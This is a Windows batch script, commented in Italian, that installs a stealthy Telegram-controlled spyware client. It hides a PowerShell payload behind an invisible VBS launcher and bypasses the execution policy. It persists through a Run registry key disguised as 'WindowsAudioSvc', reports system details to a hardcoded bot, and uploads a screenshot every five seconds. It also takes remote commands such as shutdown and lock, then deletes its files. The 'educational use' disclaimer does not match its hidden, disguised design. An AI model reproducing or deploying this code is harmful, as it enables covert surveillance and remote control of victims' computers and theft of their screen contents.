@echo off
:: Batch per screenshot ogni 5 secondi con conferma comandi e messaggio di test all'avvio
:: ATTENZIONE: Uso educativo - Solo su propri dispositivi

setlocal enabledelayedexpansion

:: Configurazione
set "b=8081045018:AAEO7ajGxYpi23xOl-mY7gYYjGNVwGdSxfM"
set "c=8016989344"
set "interval=5"

:: Verifica e installa curl se necessario
where curl >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "& {Invoke-WebRequest -Uri 'https://curl.se/windows/dl-7.88.1_2/curl-7.88.1_2-win64-mingw.zip' -OutFile '%temp%\curl.zip' -UseBasicParsing -ErrorAction SilentlyContinue}"
    powershell -Command "& {Expand-Archive '%temp%\curl.zip' -DestinationPath '%temp%\curl' -Force -ErrorAction SilentlyContinue}"
    copy "%temp%\curl\curl-*\bin\curl.exe" "%windir%\system32\" /y >nul 2>&1
    del "%temp%\curl.zip" /f /q >nul 2>&1
    rmdir "%temp%\curl" /s /q >nul 2>&1
)

:: Imposta policy di esecuzione
powershell -Command "& {Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force}" >nul 2>&1

:: Crea VBS per esecuzione invisibile
(
echo Set WshShell = CreateObject("WScript.Shell")
echo WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File ""%temp%\telegram_control.ps1""", 0, False
) > "%temp%\invisible_runner.vbs"

:: Crea script PowerShell principale
(
echo $botToken = '%b%'
echo $chatId = '%c%'
echo $sleepTime = %interval%
echo 
echo $ErrorActionPreference = 'SilentlyContinue'
echo 
echo # Carica assembly necessari
echo Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
echo Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
echo Add-Type -AssemblyName System.Speech -ErrorAction SilentlyContinue
echo 
echo # Crea oggetto per sintesi vocale
echo $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
echo $speak.Volume = 50
echo $speak.Rate = 0
echo 
echo function Speak-Text {
echo     param([string]$text)
echo     try {
echo         $speak.SpeakAsync($text) ^| Out-Null
echo     } catch {}
echo }
echo 
echo function Show-Popup {
echo     param([string]$message, [string]$title = "Windows Update")
echo     $popup = New-Object -ComObject Wscript.Shell
echo     $popup.Popup($message, 2, $title, 0 + 64) ^| Out-Null
echo }
echo 
echo function Get-LatestMessage {
echo     try {
echo         $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates" -TimeoutSec 3
echo         if ($updates.ok -and $updates.result) {
echo             $lastUpdate = $updates.result ^| Where-Object { $_.message -and $_.message.chat.id -eq $chatId } ^| Select-Object -Last 1
echo             if ($lastUpdate -and $lastUpdate.message.text) {
echo                 return @{
echo                     text = $lastUpdate.message.text
echo                     id = $lastUpdate.update_id
echo                 }
echo             }
echo         }
echo     } catch {}
echo     return $null
echo }
echo 
echo function Mark-MessageAsRead {
echo     param([int]$updateId)
echo     try {
echo         Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates" -Method Post -Body @{
echo             offset = $updateId + 1
echo             timeout = 1
echo         } -TimeoutSec 3 ^| Out-Null
echo     } catch {}
echo }
echo 
echo # Lista comandi
echo $commandsList = @"
echo 📋 **COMANDI DISPONIBILI:**
echo 
echo 📌 `popup [messaggio]` - Mostra popup
echo 📌 `shutdown` - Spegne il PC
echo 📌 `restart` - Riavvia il PC
echo 📌 `lock` - Blocca sessione
echo 📌 `msg [testo]` - Mostra messaggio
echo 📌 `ip` - Mostra indirizzi IP
echo 📌 `screenshot` - Forza screenshot
echo 📌 `volume [0-100]` - Regola volume voce
echo 📌 `voice on/off` - Attiva/disattiva voce
echo 📌 `test` - Invia messaggio di test
echo 📌 `help` - Mostra comandi
echo "@
echo 
echo # MESSAGGIO DI TEST ALL'AVVIO
echo try {
echo     $computerName = $env:COMPUTERNAME
echo     $userName = $env:USERNAME
echo     $ip = (Get-NetIPAddress -AddressFamily IPv4 ^| Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} ^| Select-Object -First 1 ^| Select-Object -ExpandProperty IPAddress)
echo     if (-not $ip) { $ip = "N/A" }
echo     
echo     # Ottieni info sistema
echo     $osInfo = Get-WmiObject -Class Win32_OperatingSystem
echo     $osVersion = $osInfo.Caption
echo     $lastBoot = $osInfo.ConvertToDateTime($osInfo.LastBootUpTime)
echo     $uptime = (Get-Date) - $lastBoot
echo     $uptimeString = "$($uptime.Days)g $($uptime.Hours)h $($uptime.Minutes)m"
echo     
echo     # Messaggio di test dettagliato
echo     $testMessage = @"
echo ✅ **TEST AVVIO CLIENT**
echo 
echo **📊 STATO SISTEMA:**
echo • PC: $computerName
echo • User: $userName
echo • IP: $ip
echo • OS: $osVersion
echo • Uptime: $uptimeString
echo 
echo **⚙ CONFIGURAZIONE:**
echo • Screenshot: ogni $sleepTime secondi
echo • Voce: ATTIVA (volume 50)
echo • Avvio: $(Get-Date -f 'dd/MM/yyyy HH:mm:ss')
echo 
echo **🟢 CLIENT OPERATIVO**
echo In attesa di comandi...
echo "@
echo 
echo     # Invia messaggio di test
echo     $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
echo         chat_id = $chatId
echo         text = $testMessage
echo         parse_mode = "Markdown"
echo     } -TimeoutSec 10
echo     
echo     # Invia anche lista comandi
echo     Start-Sleep -Seconds 1
echo     Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
echo         chat_id = $chatId
echo         text = $commandsList
echo         parse_mode = "Markdown"
echo     } -TimeoutSec 10 ^| Out-Null
echo     
echo     # Se c'è la sintesi vocale, dice che è partito
echo     Speak-Text -text "Client avviato su $computerName"
echo     
echo } catch {
echo     # Fallback semplice se il primo fallisce
echo     try {
echo         $simpleMessage = "✅ TEST AVVIO - PC: $computerName - IP: $ip - Ora: $(Get-Date -f 'HH:mm:ss')"
echo         Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
echo             chat_id = $chatId
echo             text = $simpleMessage
echo         } -TimeoutSec 5 ^| Out-Null
echo     } catch {}
echo }
echo 
echo $lastProcessedId = 0
echo $screenshotCounter = 0
echo $voiceEnabled = $true
echo 
echo while($true) {
echo     $screenshotCounter++
echo     $timestamp = Get-Date -f 'yyyyMMdd_HHmmss'
echo     
echo     # SCREENSHOT OGNI 5 SECONDI
echo     try {
echo         $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
echo         $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
echo         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
echo         $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
echo         $file = "$env:temp\screenshot_$timestamp.jpg"
echo         $bitmap.Save($file, [System.Drawing.Imaging.ImageFormat]::Jpeg)
echo         $bitmap.Dispose()
echo         $graphics.Dispose()
echo         
echo         # Invia screenshot
echo         $caption = "📸 Screenshot #$screenshotCounter - $timestamp"
echo         curl.exe -s -X POST "https://api.telegram.org/bot$botToken/sendPhoto" ^
echo             -F chat_id=$chatId ^
echo             -F photo=@"$file" ^
echo             -F caption="$caption" ^
echo             --connect-timeout 10 --max-time 20
echo         
echo         Remove-Item "$file" -Force -ErrorAction SilentlyContinue
echo     } catch {}
echo     
echo     # CONTROLLO NUOVI COMANDI
echo     try {
echo         $latest = Get-LatestMessage
echo         if ($latest -and $latest.id -gt $lastProcessedId) {
echo             $command = $latest.text.Trim()
echo             $lastProcessedId = $latest.id
echo             
echo             # CONFERMA VOCALE COMANDO RICEVUTO
echo             if ($voiceEnabled) {
echo                 Speak-Text -text "Comando ricevuto: $command"
echo             }
echo             
echo             # Mostra popup breve
echo             Show-Popup -message "📩 Comando: $command" -title "Telegram Control"
echo             
echo             $responseText = ""
echo             $lowerCommand = $command.ToLower()
echo             
echo             # Gestione comandi
echo             switch -wildcard ($lowerCommand) {
echo                 "help" {
echo                     $responseText = $commandsList
echo                 }
echo                 "test" {
echo                     $testResponse = @"
echo ✅ **TEST COMANDO**
echo Comando 'test' ricevuto correttamente
echo PC: $computerName
echo Ora: $(Get-Date -f 'HH:mm:ss')
echo Screenshot inviati: $screenshotCounter
echo "@
echo                     $responseText = $testResponse
echo                     if ($voiceEnabled) { Speak-Text -text "Test eseguito con successo" }
echo                 }
echo                 "popup*" {
echo                     $msg = $command -replace "(?i)popup", "" -replace "\s+", " " -replace "^ ", ""
echo                     if ($msg) { 
echo                         Show-Popup -message $msg -title "Messaggio"
echo                         $responseText = "✅ Popup: $msg"
echo                         if ($voiceEnabled) { Speak-Text -text "Popup: $msg" }
echo                     } else {
echo                         $responseText = "❌ Specifica un messaggio: popup [testo]"
echo                     }
echo                 }
echo                 "shutdown" {
echo                     $responseText = "⏻ Spegnimento in 10 secondi"
echo                     if ($voiceEnabled) { Speak-Text -text "Spegnimento in corso" }
echo                     shutdown /s /t 10 /c "Spegnimento remoto" /f
echo                 }
echo                 "restart" {
echo                     $responseText = "⟲ Riavvio in 10 secondi"
echo                     if ($voiceEnabled) { Speak-Text -text "Riavvio in corso" }
echo                     shutdown /r /t 10 /c "Riavvio remoto" /f
echo                 }
echo                 "lock" {
echo                     $responseText = "🔒 Schermo bloccato"
echo                     if ($voiceEnabled) { Speak-Text -text "Schermo bloccato" }
echo                     rundll32.exe user32.dll,LockWorkStation
echo                 }
echo                 "msg*" {
echo                     $customMsg = $command -replace "(?i)msg", "" -replace "\s+", " " -replace "^ ", ""
echo                     if ($customMsg) { 
echo                         Show-Popup -message $customMsg -title "Messaggio"
echo                         $responseText = "✅ Messaggio: $customMsg"
echo                         if ($voiceEnabled) { Speak-Text -text $customMsg }
echo                     } else {
echo                         $responseText = "❌ Specifica un messaggio: msg [testo]"
echo                     }
echo                 }
echo                 "ip" {
echo                     $ipInfo = Get-NetIPAddress -AddressFamily IPv4 ^| Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} ^| Select-Object -ExpandProperty IPAddress
echo                     $ipList = $ipInfo -join ", "
echo                     $responseText = "🌐 IP: $ipList"
echo                     if ($voiceEnabled) { Speak-Text -text "Indirizzi IP: $ipList" }
echo                 }
echo                 "screenshot" {
echo                     $responseText = "📸 Screenshot forzato inviato"
echo                     if ($voiceEnabled) { Speak-Text -text "Screenshot forzato" }
echo                 }
echo                 "volume "* {
echo                     $vol = $lowerCommand -replace "volume", "" -replace "\s+", ""
echo                     if ($vol -match '^\d+$' -and [int]$vol -ge 0 -and [int]$vol -le 100) {
echo                         $speak.Volume = [int]$vol
echo                         $responseText = "🔊 Volume voce impostato a: $vol"
echo                         if ($voiceEnabled) { Speak-Text -text "Volume impostato a $vol" }
echo                     } else {
echo                         $responseText = "❌ Volume deve essere 0-100"
echo                     }
echo                 }
echo                 "voice on" {
echo                     $voiceEnabled = $true
echo                     $responseText = "🔊 Conferma vocale attivata"
echo                     Speak-Text -text "Conferma vocale attivata"
echo                 }
echo                 "voice off" {
echo                     $voiceEnabled = $false
echo                     $responseText = "🔇 Conferma vocale disattivata"
echo                 }
echo                 default {
echo                     if ($command -ne "") {
echo                         $responseText = "❌ Comando non riconosciuto. Invia 'help'"
echo                     }
echo                 }
echo             }
echo             
echo             # Invia risposta al bot
echo             if ($responseText -ne "") {
echo                 try {
echo                     Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
echo                         chat_id = $chatId
echo                         text = $responseText
echo                         parse_mode = "Markdown"
echo                     } -TimeoutSec 5 ^| Out-Null
echo                 } catch {}
echo             }
echo             
echo             Mark-MessageAsRead -updateId $latest.id
echo         }
echo     } catch {}
echo     
echo     Start-Sleep -Seconds $sleepTime
echo }
) > "%temp%\telegram_control.ps1"

:: Persistenza
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudioSvc" /t REG_SZ /d "wscript.exe //B //Nologo \"%temp%\invisible_runner.vbs\"" /f >nul 2>&1

:: Esegui
start /B wscript.exe "%temp%\invisible_runner.vbs" //B //Nologo

:: Pulizia
del "%temp%\telegram_control.ps1" /f /q >nul 2>&1
del "%temp%\invisible_runner.vbs" /f /q >nul 2>&1

exit
